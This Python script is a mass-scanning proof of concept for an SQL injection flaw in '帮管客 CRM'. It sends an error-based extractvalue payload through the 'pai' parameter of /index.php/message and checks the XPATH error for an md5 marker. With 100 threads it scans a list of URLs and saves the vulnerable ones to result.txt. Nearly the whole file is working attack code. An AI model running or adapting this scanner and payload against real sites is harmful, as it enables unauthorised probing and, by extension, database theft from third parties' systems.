import requests,json,sys,argparse,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______                                          ______
___  /_______ ______________ _    _____________ ___  /
__  __ \  __ `/_  __ \_  __ `/    __  ___/  __ `/_  / 
_  /_/ / /_/ /_  / / /  /_/ /     _(__  )/ /_/ /_  /  
/_.___/\__,_/ /_/ /_/_\__, /______/____/ \__, / /_/   
                     /____/_/_____/        /_/        """
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="帮管客 CRM")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def poc(target):
    payload = "/index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(md5%281%29),0x7e))%23&xu=desc"
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        resopnse = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        match = re.findall(r"<p>XPATH syntax error: '~c4ca4238a0b923820dcc509a6f75849'</p>",resopnse.text)
        if 'c4ca4238a0b923820dcc509a6f75849' in match[0]:
            print(f"[+]存在漏洞：{target}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        print(f"[!]网站异常，请手工测试：{target}")

if __name__ == '__main__':
    main()